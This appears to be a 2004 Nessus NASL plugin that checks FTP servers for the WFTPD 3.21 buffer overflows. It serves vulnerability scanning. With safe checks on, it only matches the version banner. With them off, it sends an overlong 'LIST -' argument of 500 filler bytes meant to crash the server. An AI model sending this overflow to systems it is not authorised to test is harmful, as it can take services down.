#
# Copyright (C) 2004 Tenable Network Security
#
# Date: Sat, 28 Feb 2004 21:52:33 +0000
# From: axl rose <rdxaxl@hotmail.com>
# To: full-disclosure@lists.netsys.com, bugtraq@securityfocus.com
# Cc: info@texis.com
# Subject: [Full-Disclosure] Critical WFTPD buffer overflow vulnerability

if(description)
{
 script_id(12083);
 script_cve_id("CVE-2004-0340", "CVE-2004-0341", "CVE-2004-0342");
 script_bugtraq_id(9767);
 script_version ("$Revision: 1.6 $");
 
 name["english"] = "WFTP 3.21 multiple remote overflows";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote FTP server is  vulnerable to at least two remote stack-based 
overflows and two Denial of Service attacks.  An attacker can use these 
flaws to gain remote access to the WFTPD server.

Solution : if you are using wftp, then upgrade to a version greater 
than 3.21 R1, if you are not, then contact your vendor for a fix.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "WFTPD 3.21 remote overflows";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK); 
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "FTP";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes","ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 script_exclude_keys("ftp/false_ftp");
 exit(0);
}

# The script code starts here
#
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if (! get_port_state(port)) exit(0);

banner = get_ftp_banner(port: port);
if ( "WFTPD" >!< banner ) exit(0);

if(safe_checks()) {
 if (egrep(string:banner, pattern:"^220.*WFTPD ([0-2]\.*|3\.[0-2]) service")) {
 desc = "
You are running WFTP. Some versions of this
server are vulnerable to several remote overflows
as well as remote Denial of Service attacks.
 
An attacker may use this flaw to prevent you
from publishing anything using FTP.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : Make sure you are running WFTP version
greater than 3.21 R1 

Risk factor : High";
 security_hole(port:port, data:desc);
 }
 exit(0);
} else {
 login = get_kb_item("ftp/login");
 pass  = get_kb_item("ftp/password");
 soc = open_sock_tcp(port);
 if(soc) {
    if(login) {
        if(ftp_authenticate(socket:soc, user:login, pass:pass)) {
            send(socket:soc, data:string("LIST -",crap(500)," \r\n"));
            ftp_close(socket:soc);
            soc2 = open_sock_tcp(port);
            if (!soc2) security_hole(port);
            r = ftp_recv_line(socket:soc2);        
            if (!r) security_hole(port);
        }
    }
 }
}
